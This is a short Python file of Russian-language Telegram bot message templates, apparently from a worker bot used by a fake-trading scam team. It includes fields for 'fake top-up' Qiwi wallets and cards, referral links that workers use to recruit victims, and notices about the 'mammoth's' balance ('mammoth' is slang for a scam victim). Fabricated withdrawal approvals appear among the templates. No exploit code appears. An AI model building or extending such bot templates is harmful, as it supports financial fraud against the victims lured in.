from aiogram.utils.emoji import emojize

exact_out_text = emojize(
    "<b>Ваша заявка на вывод одобрена!</b>\n\n"
    ":money_with_wings: Сумма вывода: <b>{amount} RUB</b>"
)


trading_text = emojize(
    "Трейдинг :chart: [<code>{uniq_key}</code>]\n\n"
    "<a href='t.me/{bot_username}'>Бот для работы</a>\n"
    "<a href='t.me/{support_username}'>Тех. поддержка</a>\n\n"
    "<a href='t.me/{bot_username}?start={uniq_key}'>Твоя реферальная ссылка</a>\n\n"
    ":kiwi_fruit: Qiwi с фейк пополнения:\n"
    "{pay_qiwis}\n\n"
    ":credit_card: Карты фейк пополнения:\n"
    "{pay_cards}"
)

tdg_balance_changed_text = emojize(
    ":chart: Баланс мамонта /t{user_id} - <b>{amount} RUB</b>"
)
